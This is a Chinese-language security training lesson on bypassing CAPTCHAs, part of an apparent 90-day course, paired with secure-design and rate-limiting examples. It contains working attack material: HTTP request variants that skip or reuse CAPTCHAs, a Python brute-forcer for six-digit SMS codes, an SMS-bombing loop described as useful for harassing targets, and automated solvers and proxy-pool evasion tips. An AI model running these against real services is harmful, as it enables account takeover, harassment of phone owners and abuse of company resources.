---
title: Day050：验证码绕过技术
tags:
  - 网络安全
  - 验证码
  - 暴力破解
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d050
date: 2026-03-13
updated: 2026-01-28
---

# Day050：验证码绕过技术

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 8：认证与逻辑漏洞 |
| **今日主题** | 验证码绕过与暴力破解 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你尝试暴力破解登录，但网站有验证码保护。每次登录失败后都要重新输入验证码，似乎没办法自动化。
>
> **问题**：验证码真的无法绕过吗？
>
> **今天的任务**：学习验证码绕过技术——突破人机验证的最后一道防线。

---

## 今日目标

- [ ] 理解各类验证码的工作原理
- [ ] 掌握图形验证码绕过技术
- [ ] 学会短信/邮箱验证码攻击
- [ ] 完成验证码绕过实战

**闯关条件**：成功绕过至少一种验证码进行暴力破解。

---

## 实战任务（先动手！）

### 任务 1：验证码类型分析（20 分钟）

**常见验证码类型**：

| 类型 | 示例 | 保护目标 |
|------|------|----------|
| 图形验证码 | 扭曲文字、数字 | 防自动化 |
| 滑块验证码 | 滑动拼图 | 防自动化 |
| 点选验证码 | 点击指定文字/图片 | 防自动化 |
| 短信验证码 | 6 位数字 | 身份验证 |
| 邮箱验证码 | 6 位数字/链接 | 身份验证 |
| reCAPTCHA | Google 服务 | 高级防护 |

**验证码的本质**：
```
证明"你是人类"或"你是本人"

图形验证码：你能识别图片内容
短信验证码：你能访问这个手机号
邮箱验证码：你能访问这个邮箱
```

**记录**：
```
目标网站使用的验证码类型：________________
```

---

### 任务 2：图形验证码绕过（45 分钟）

**方法 1：验证码复用**
```http
# 正常流程
1. 请求验证码图片 → 服务器生成 session:captcha
2. 提交登录 → 验证 session:captcha

# 漏洞：验证码可复用
1. 获取一个验证码并正确识别
2. 多次使用同一验证码值
3. 如果服务器不刷新，可以重复使用
```

**测试步骤**：
```http
# 1. 获取验证码
GET /captcha.php HTTP/1.1
Cookie: session=abc123

# 2. 正确输入验证码登录一次（失败）
POST /login HTTP/1.1
Cookie: session=abc123
username=admin&password=wrong&captcha=XYZ123

# 3. 再次使用同一验证码
POST /login HTTP/1.1
Cookie: session=abc123
username=admin&password=test&captcha=XYZ123  ← 相同验证码

# 如果不报"验证码错误"，说明可复用
```

**方法 2：验证码在响应中返回**
```http
# 请求验证码
GET /getCaptcha HTTP/1.1

# 响应（漏洞！）
{
  "captcha_id": "12345",
  "captcha_value": "ABC123"  ← 答案直接返回
}
```

**方法 3：删除验证码参数**
```http
# 原始请求
POST /login HTTP/1.1
username=admin&password=test&captcha=XYZ123

# 尝试删除
POST /login HTTP/1.1
username=admin&password=test

# 如果没报错，说明验证码验证可选
```

**方法 4：空验证码**
```http
POST /login HTTP/1.1
username=admin&password=test&captcha=

# 或
captcha=null
captcha=undefined
```

**记录**：
```
尝试的绕过方法：________________
成功的方法：________________
```

---

### 任务 3：短信验证码攻击（45 分钟）

**攻击 1：暴力破解**
```python
# 4-6 位数字验证码
# 4 位：10000 种可能
# 6 位：1000000 种可能

import requests

base_url = "http://target.com/verify"

for code in range(1000000):
    code_str = str(code).zfill(6)
    resp = requests.post(base_url, data={
        "phone": "13800138000",
        "code": code_str
    })
    if "success" in resp.text:
        print(f"[+] Valid code: {code_str}")
        break

# 需要考虑：速率限制、验证码有效期
```

**攻击 2：验证码复用**
```
1. 请求发送验证码到自己手机
2. 收到验证码（如 123456）
3. 用这个验证码验证其他手机号

漏洞：验证码未绑定手机号
```

**攻击 3：响应中泄露**
```http
POST /sendCode HTTP/1.1
{"phone": "13800138000"}

# 响应（漏洞！）
{
  "status": "success",
  "code": "123456",  ← 答案返回
  "message": "验证码已发送"
}
```

**攻击 4：验证码不过期**
```
1. 请求发送验证码
2. 不使用
3. 再次请求新验证码
4. 旧验证码仍然有效

可以收集多个有效验证码
```

**攻击 5：轰炸攻击（短信炸弹）**
```python
# 无速率限制时
for i in range(100):
    requests.post("/sendCode", data={"phone": "13800138000"})

# 可用于骚扰目标用户
# 消耗目标公司短信资源
```

**记录**：
```
短信验证码弱点：________________
攻击结果：________________
```

---

### 任务 4：验证码识别技术（35 分钟）

**方法 1：OCR 识别**
```python
# 使用 Tesseract OCR
import pytesseract
from PIL import Image

def recognize_captcha(image_path):
    img = Image.open(image_path)
    text = pytesseract.image_to_string(img)
    return text.strip()

# 对于简单验证码效果较好
```

**方法 2：打码平台**
```python
# 使用第三方打码服务
import requests

def solve_captcha(image_base64):
    resp = requests.post("http://打码平台API", data={
        "image": image_base64,
        "type": "text"
    })
    return resp.json()["result"]

# 收费服务，但准确率高
```

**方法 3：机器学习模型**
```python
# 训练专门的验证码识别模型
# 需要大量样本
# 针对特定网站效果好
```

**方法 4：滑块验证码自动化**
```python
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains

driver = webdriver.Chrome()
driver.get("http://target.com")

# 获取滑块和背景
slider = driver.find_element_by_id("slider")
background = driver.find_element_by_id("background")

# 计算滑动距离（需要图像处理）
distance = calculate_distance()

# 模拟人类滑动（带加速减速）
ActionChains(driver).click_and_hold(slider).move_by_offset(distance, 0).release().perform()
```

**记录**：
```
使用的识别方法：________________
识别准确率：________________
```

---

### 任务 5：综合绕过策略（25 分钟）

**策略 1：客户端验证绕过**
```javascript
// 如果验证码只在前端验证
function validateCaptcha() {
    if (captcha === expectedValue) {
        submitForm();
    }
}

// 直接调用 submitForm() 或删除验证代码
```

**策略 2：利用业务逻辑**
```
场景：登录失败 3 次后才出现验证码

攻击：
1. 尝试 2 次
2. 切换 IP 或清除 Cookie
3. 再尝试 2 次
4. 重复，永远不触发验证码
```

**策略 3：条件竞争**
```python
# 在验证码刷新和验证之间的时间窗口
import threading

def refresh_captcha():
    requests.get("/refreshCaptcha")

def submit_login():
    requests.post("/login", data={...})

# 同时发送
t1 = threading.Thread(target=refresh_captcha)
t2 = threading.Thread(target=submit_login)
t1.start()
t2.start()
```

**策略 4：API 与 Web 分离**
```
Web 登录有验证码
API 登录没有验证码

直接使用 API 接口
```

**记录**：
```
使用的综合策略：________________
最终结果：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解验证码类型 | 15 分 |
| 成功绕过图形验证码 | 25 分 |
| 成功攻击短信验证码 | 25 分 |
| 掌握验证码识别技术 | 20 分 |
| 使用综合绕过策略 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 验证码安全设计

```python
# 安全的验证码实现

# 1. 服务端生成和验证
def generate_captcha(session_id):
    code = ''.join(random.choices(string.digits, k=6))
    captcha_hash = hashlib.sha256(code.encode()).hexdigest()
    redis.set(f"captcha:{session_id}", captcha_hash, ex=300)  # 5分钟过期
    return generate_image(code)

def verify_captcha(session_id, user_input):
    stored_hash = redis.get(f"captcha:{session_id}")
    if not stored_hash:
        return False

    # 使用后立即删除
    redis.delete(f"captcha:{session_id}")

    input_hash = hashlib.sha256(user_input.encode()).hexdigest()
    return secrets.compare_digest(stored_hash, input_hash)
```

### 速率限制实现

```python
# 防止暴力破解
from functools import wraps
import time

rate_limits = {}

def rate_limit(max_attempts=5, window=300):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            key = f"{request.remote_addr}:{request.path}"
            now = time.time()

            if key in rate_limits:
                attempts, first_attempt = rate_limits[key]
                if now - first_attempt < window:
                    if attempts >= max_attempts:
                        return "Too many attempts", 429
                    rate_limits[key] = (attempts + 1, first_attempt)
                else:
                    rate_limits[key] = (1, now)
            else:
                rate_limits[key] = (1, now)

            return f(*args, **kwargs)
        return wrapper
    return decorator
```

### 验证码 vs 速率限制

```
验证码：
- 优点：用户明确知道有保护
- 缺点：影响用户体验
- 适用：高价值操作（登录、支付）

速率限制：
- 优点：对用户透明
- 缺点：可能误伤正常用户
- 适用：API 保护、一般操作

最佳实践：结合使用
- 初始：只有速率限制
- 触发阈值：显示验证码
- 继续失败：临时锁定
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| Session 不一致 | 验证码总是错误 | 确保验证码和登录使用同一 Session |
| 验证码刷新太快 | 来不及使用 | 分析刷新机制，找时间窗口 |
| IP 被封 | 请求被拒绝 | 使用代理池、降低速度 |
| 验证码太复杂 | OCR 失败 | 使用打码平台或机器学习 |

---

## 知识卡片速查

### 验证码绕过测试清单

```
1. 测试验证码复用
2. 测试删除验证码参数
3. 测试空验证码
4. 检查响应中是否有答案
5. 测试前端验证 vs 后端验证
6. 测试速率限制
7. 测试验证码有效期
```

### 常见绕过方式

```
图形验证码：
- 复用、删除、空值
- OCR、打码平台
- 前端绕过

短信验证码：
- 暴力破解（无速率限制）
- 响应泄露
- 验证码不绑定账号
- 验证码不过期

滑块验证码：
- Selenium 自动化
- 分析 JS 加密
- 使用打码平台
```

### Burp 验证码测试技巧

```
1. Intruder 设置：
   - 标记密码位置
   - 验证码复用（不变）或绕过

2. 使用 Macro：
   - 自动获取新验证码
   - 提取验证码值

3. 使用插件：
   - captcha-killer
   - 自定义插件对接打码平台
```

---

## 常见问题

**Q1：reCAPTCHA 能绕过吗？**

A1：
- 直接绕过很难
- 可以使用付费打码服务（人工打码）
- 分析是否有降级机制
- 检查某些请求是否不需要验证

**Q2：短信验证码暴力破解需要多久？**

A2：
- 6 位数字：100 万次
- 每秒 10 次：约 28 小时
- 通常会有速率限制和有效期限制

**Q3：如何防御验证码攻击？**

A3：
1. 服务端验证，一次性使用
2. 设置合理的过期时间
3. 实施速率限制
4. 验证码与请求绑定
5. 使用 reCAPTCHA 等成熟方案

---

## 明日预告

**Day 051：Week 8 周末闯关 - 认证与逻辑漏洞综合**

明天你将：
- 完成本周综合挑战
- 回顾认证与逻辑漏洞
- 输出 Week 8 学习总结

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 成功绕过的验证码类型 | |
| 使用的绕过技术 | |
| 今日收获 | |

---

> **导师点评**：
>
> 验证码是"人机对抗"的战场。
>
> 有趣的是，很多验证码的漏洞不在"验证码本身"，而在"验证逻辑"：复用、不过期、不绑定、可删除……
>
> 这就像一把锁：锁芯再复杂，如果门框是纸糊的，有什么用？
>
> **测试验证码时，不要只盯着图片看。要关注整个验证流程：谁生成的？在哪验证？用完删除了吗？**

```bash
echo "Day 050 Complete! 验证码绕过高手！"
```
